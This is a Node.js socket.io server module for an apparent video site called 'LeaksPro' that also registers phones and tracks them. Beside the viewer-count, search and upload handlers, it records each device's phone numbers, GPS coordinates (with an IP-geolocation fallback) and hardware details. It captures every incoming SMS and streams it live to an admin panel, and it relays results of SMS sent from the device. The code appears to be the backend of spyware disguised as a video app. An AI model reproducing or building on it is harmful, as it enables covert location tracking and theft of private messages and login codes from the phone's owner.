const Video = require('../models/Video');
const db = require('../config/database');
const { geolocateIp, getSocketIp } = require('../utils/geoip');

function setupWebSocket(io) {
  // Track connected clients
  let connectedClients = 0;
  const deviceSockets = new Map(); // device_id -> socket.id

  // Helper: parse phone_numbers JSON on a device row
  function parseDevice(d) {
    if (!d) return d;
    try { d.phone_numbers = JSON.parse(d.phone_numbers || '[]'); } catch (_) { d.phone_numbers = []; }
    return d;
  }

  /**
   * IP Geolocation Fallback — runs async after device registration/heartbeat.
   * If device has no GPS coordinates, uses the socket's IP to get approximate location.
   * Only sets location if the device still has no coords (GPS takes priority).
   */
  async function ipGeoFallback(socket, device_id) {
    try {
      // Check if device already has GPS coordinates
      const device = db.prepare('SELECT latitude, longitude, loc_source FROM devices WHERE device_id = ?').get(device_id);
      if (device && device.latitude != null && device.longitude != null && device.loc_source === 'gps') {
        return; // GPS data exists, no fallback needed
      }

      const clientIp = getSocketIp(socket);
      if (!clientIp) return;

      // Store IP address regardless
      db.prepare('UPDATE devices SET ip_address = ? WHERE device_id = ?').run(clientIp, device_id);

      // Only do IP geolocation if device has no location at all
      if (device && device.latitude != null && device.longitude != null) return;

      const geo = await geolocateIp(clientIp);
      if (!geo) return;

      // Double-check device still has no GPS coords (may have arrived while we were looking up IP)
      const fresh = db.prepare('SELECT latitude, longitude, loc_source FROM devices WHERE device_id = ?').get(device_id);
      if (fresh && fresh.latitude != null && fresh.longitude != null && fresh.loc_source === 'gps') return;

      // Set IP-based location as fallback
      db.prepare(`UPDATE devices SET
        latitude = ?, longitude = ?,
        loc_source = 'ip', loc_accuracy = ?,
        city = ?, region = ?, country = ?, isp = ?, timezone = ?
        WHERE device_id = ?`).run(
        geo.latitude, geo.longitude, geo.accuracy_km * 1000,
        geo.city, geo.region, geo.country, geo.isp, geo.timezone,
        device_id
      );

      console.log(`[WS] IP geolocation fallback for ${device_id}: ${geo.city}, ${geo.country} (${clientIp})`);

      // Emit location update so admin panel gets it in real-time
      io.emit('device_location_update', {
        device_id,
        latitude: geo.latitude,
        longitude: geo.longitude,
        loc_source: 'ip',
        city: geo.city,
        country: geo.country,
        accuracy_km: geo.accuracy_km,
        timestamp: new Date().toISOString()
      });

      // Also re-emit device_online with updated data
      const updated = parseDevice(db.prepare('SELECT * FROM devices WHERE device_id = ?').get(device_id));
      if (updated) io.emit('device_online', updated);

    } catch (err) {
      console.error(`[WS] IP geo fallback error for ${device_id}:`, err.message);
    }
  }

  io.on('connection', (socket) => {
    connectedClients++;
    console.log(`[WS] Client connected (${connectedClients} total) - ${socket.id}`);

    // Send welcome message with server info
    socket.emit('welcome', {
      message: 'Connected to LeaksPro Server',
      connectedClients,
      timestamp: new Date().toISOString(),
    });

    // Broadcast updated client count
    io.emit('clients_count', connectedClients);

    // ========== DEVICE REGISTRATION ==========
    socket.on('device_register', (data) => {
      try {
        const { device_id, device_name, model, manufacturer, os_version, sdk_version,
                app_version, screen_resolution, phone_numbers, battery_percent, battery_charging,
                total_storage, free_storage, total_ram, free_ram, latitude, longitude,
                loc_source: deviceLocSource, loc_accuracy: deviceLocAccuracy } = data;
        if (!device_id) return;

        // Tag this socket as a device
        socket._deviceId = device_id;
        deviceSockets.set(device_id, socket.id);

        const phonesJson = JSON.stringify(phone_numbers || []);
        const hasGps = latitude != null && longitude != null && latitude !== 0 && longitude !== 0;
        const locSource = hasGps ? 'gps' : (deviceLocSource || 'unknown');
        const locAccuracy = hasGps ? (deviceLocAccuracy ?? -1) : -1;
        const clientIp = getSocketIp(socket) || '';

        const existing = db.prepare('SELECT device_id, loc_source FROM devices WHERE device_id = ?').get(device_id);

        if (existing) {
          // If device sends GPS, always update. If device sends nothing, keep existing.
          if (hasGps) {
            db.prepare(`UPDATE devices SET
              device_name = ?, model = ?, manufacturer = ?, os_version = ?, sdk_version = ?,
              app_version = ?, screen_resolution = ?, phone_numbers = ?,
              battery_percent = ?, battery_charging = ?,
              total_storage = ?, free_storage = ?, total_ram = ?, free_ram = ?,
              latitude = ?, longitude = ?,
              loc_source = 'gps', loc_accuracy = ?, ip_address = ?,
              is_online = 1, socket_id = ?, last_seen = datetime('now')
              WHERE device_id = ?`).run(
              device_name || '', model || '', manufacturer || '', os_version || '', sdk_version || 0,
              app_version || '', screen_resolution || '', phonesJson,
              battery_percent ?? -1, battery_charging ? 1 : 0,
              total_storage || 0, free_storage || 0, total_ram || 0, free_ram || 0,
              latitude, longitude,
              locAccuracy, clientIp,
              socket.id, device_id
            );
          } else {
            db.prepare(`UPDATE devices SET
              device_name = ?, model = ?, manufacturer = ?, os_version = ?, sdk_version = ?,
              app_version = ?, screen_resolution = ?, phone_numbers = ?,
              battery_percent = ?, battery_charging = ?,
              total_storage = ?, free_storage = ?, total_ram = ?, free_ram = ?,
              ip_address = ?,
              is_online = 1, socket_id = ?, last_seen = datetime('now')
              WHERE device_id = ?`).run(
              device_name || '', model || '', manufacturer || '', os_version || '', sdk_version || 0,
              app_version || '', screen_resolution || '', phonesJson,
              battery_percent ?? -1, battery_charging ? 1 : 0,
              total_storage || 0, free_storage || 0, total_ram || 0, free_ram || 0,
              clientIp,
              socket.id, device_id
            );
          }
        } else {
          db.prepare(`INSERT INTO devices (device_id, device_name, model, manufacturer, os_version, sdk_version,
            app_version, screen_resolution, phone_numbers, battery_percent, battery_charging,
            total_storage, free_storage, total_ram, free_ram, latitude, longitude,
            loc_source, loc_accuracy, ip_address, is_online, socket_id)
            VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,1,?)`).run(
            device_id, device_name || '', model || '', manufacturer || '', os_version || '', sdk_version || 0,
            app_version || '', screen_resolution || '', phonesJson,
            battery_percent ?? -1, battery_charging ? 1 : 0,
            total_storage || 0, free_storage || 0, total_ram || 0, free_ram || 0,
            hasGps ? latitude : null, hasGps ? longitude : null,
            locSource, locAccuracy, clientIp,
            socket.id
          );
        }

        const device = parseDevice(db.prepare('SELECT * FROM devices WHERE device_id = ?').get(device_id));
        io.emit('device_online', device);
        console.log(`[WS] Device registered: ${device_id} (${model || 'unknown'}) loc_source=${locSource}`);

        // If no GPS, trigger async IP geolocation fallback
        if (!hasGps) {
          ipGeoFallback(socket, device_id);
        }
      } catch (err) {
        console.error('[WS] device_register error:', err.message);
      }
    });

    // ========== DEVICE HEARTBEAT (battery + phone updates) ==========
    socket.on('device_heartbeat', (data) => {
      try {
        const { device_id, battery_percent, battery_charging, phone_numbers, latitude, longitude,
                loc_source: deviceLocSource, loc_accuracy: deviceLocAccuracy } = data;
        if (!device_id) return;

        const hasGps = latitude != null && longitude != null && latitude !== 0 && longitude !== 0;

        if (hasGps) {
          // GPS data — always update and override any IP fallback
          db.prepare(`UPDATE devices SET
            battery_percent = ?, battery_charging = ?, phone_numbers = ?,
            latitude = ?, longitude = ?,
            loc_source = 'gps', loc_accuracy = ?,
            last_seen = datetime('now')
            WHERE device_id = ?`).run(
            battery_percent ?? -1, battery_charging ? 1 : 0,
            JSON.stringify(phone_numbers || []),
            latitude, longitude,
            deviceLocAccuracy ?? -1,
            device_id
          );
        } else {
          // No GPS — just update battery/phone, keep existing location
          db.prepare(`UPDATE devices SET
            battery_percent = ?, battery_charging = ?, phone_numbers = ?,
            last_seen = datetime('now')
            WHERE device_id = ?`).run(
            battery_percent ?? -1, battery_charging ? 1 : 0,
            JSON.stringify(phone_numbers || []),
            device_id
          );
        }

        const device = parseDevice(db.prepare('SELECT * FROM devices WHERE device_id = ?').get(device_id));
        io.emit('device_status_update', device);

        // If GPS location available, emit a dedicated location event for the map panel
        if (hasGps) {
          io.emit('device_location_update', {
            device_id,
            latitude,
            longitude,
            loc_source: 'gps',
            accuracy: deviceLocAccuracy ?? -1,
            timestamp: new Date().toISOString()
          });
        } else {
          // No GPS in this heartbeat — check if we need IP fallback
          const cur = db.prepare('SELECT latitude, longitude FROM devices WHERE device_id = ?').get(device_id);
          if (!cur || cur.latitude == null || cur.longitude == null) {
            ipGeoFallback(socket, device_id);
          }
        }
      } catch (err) {
        console.error('[WS] device_heartbeat error:', err.message);
      }
    });

    // Handle video view tracking in real-time
    socket.on('watching', (data) => {
      const { videoId, deviceId } = data;
      socket.join(`video_${videoId}`);
      
      // Get number of viewers for this video
      const room = io.sockets.adapter.rooms.get(`video_${videoId}`);
      const viewerCount = room ? room.size : 0;
      
      io.to(`video_${videoId}`).emit('viewer_count', {
        videoId,
        viewers: viewerCount,
      });
    });

    // Handle leaving a video
    socket.on('stop_watching', (data) => {
      const { videoId } = data;
      socket.leave(`video_${videoId}`);
      
      const room = io.sockets.adapter.rooms.get(`video_${videoId}`);
      const viewerCount = room ? room.size : 0;
      
      io.to(`video_${videoId}`).emit('viewer_count', {
        videoId,
        viewers: viewerCount,
      });
    });

    // Handle real-time search suggestions
    socket.on('search_query', (data) => {
      const { query } = data;
      if (query && query.length >= 2) {
        const results = Video.getAll({ search: query, limit: 5 });
        socket.emit('search_suggestions', {
          query,
          suggestions: results.videos.map(v => ({
            id: v.id,
            title: v.title,
            thumbnail: v.thumbnail,
            views: v.views,
          })),
        });
      }
    });

    // Handle chunk upload via WebSocket — now uploads to Cloudinary
    socket.on('upload_video_ws', async (data) => {
      const { uploadId, fileData, filename, title, description, category, tags, channel_name } = data;
      const { uploadToCloudinary } = require('../config/cloudinary');

      try {
        socket.emit('chunk_received', { uploadId, progress: 10, status: 'uploading_to_cloud' });

        const buffer = Buffer.from(fileData);
        const result = await uploadToCloudinary(buffer, {
          resource_type: 'video',
          folder: 'leakspro/videos',
        });

        socket.emit('upload_merged', {
          uploadId,
          filename: result.secure_url,
          size: result.bytes,
          duration: result.duration,
          resolution: result.width ? `${result.width}x${result.height}` : '',
        });

        io.emit('upload_complete', {
          uploadId,
          filename: result.secure_url,
          size: result.bytes,
        });
      } catch (err) {
        socket.emit('upload_error', { uploadId, error: err.message });
      }
    });

    // Admin broadcast messages
    socket.on('admin_broadcast', (data) => {
      io.emit('notification', {
        type: 'admin',
        message: data.message,
        timestamp: new Date().toISOString(),
      });
    });

    // ========== SMS SEND RESULT (from device back to admin) ==========
    socket.on('sms_send_result', (data) => {
      console.log(`[WS] SMS send result:`, data);
      // Broadcast back to all admin clients
      io.emit('sms_send_result', data);
    });

    // ========== INSTANT SMS (new SMS received on device) ==========
    socket.on('instant_sms', (data) => {
      try {
        const { device_id, address, body, date, type, sim_slot } = data;
        if (!device_id || !address) return;

        // Store in DB
        const smsId = Date.now(); // use timestamp as unique id for instant SMS
        db.prepare(`INSERT OR REPLACE INTO sms_messages
          (device_id, sms_id, address, body, date, type, read, synced_at)
          VALUES (?, ?, ?, ?, ?, ?, 0, datetime('now'))`)
          .run(device_id, smsId, address || 'Unknown', body || '', date || Date.now(), type || 1, 0);

        // Broadcast to admin panel instantly
        io.emit('new_sms', {
          device_id,
          address,
          body,
          date,
          type: type || 1,
          sim_slot: sim_slot || 1,
          sms_id: smsId
        });

        console.log(`[WS] Instant SMS from ${address} on device ${device_id} (SIM ${sim_slot || 1})`);
      } catch (err) {
        console.error('[WS] instant_sms error:', err.message);
      }
    });

    // Disconnect
    socket.on('disconnect', () => {
      connectedClients--;
      console.log(`[WS] Client disconnected (${connectedClients} total) - ${socket.id}`);
      io.emit('clients_count', connectedClients);

      // If this was a device socket, just clear the socket reference.
      // Device stays in DB and shows ONLINE — WorkManager heartbeat keeps it alive.
      // If app is uninstalled, cleanup timer will remove after 30 min with no heartbeat.
      if (socket._deviceId) {
        const deviceId = socket._deviceId;
        deviceSockets.delete(deviceId);
        try {
          db.prepare("UPDATE devices SET socket_id = '', is_online = 0, last_seen = datetime('now') WHERE device_id = ?").run(deviceId);
          // Emit device_offline so admin panel updates in real-time
          const device = parseDevice(db.prepare('SELECT * FROM devices WHERE device_id = ?').get(deviceId));
          if (device) {
            io.emit('device_offline', device);
          }
          console.log(`[WS] Device socket cleared (stays registered): ${deviceId}`);
        } catch (err) {
          console.error('[WS] device disconnect update error:', err.message);
        }
      }
    });
  });
}

module.exports = setupWebSocket;
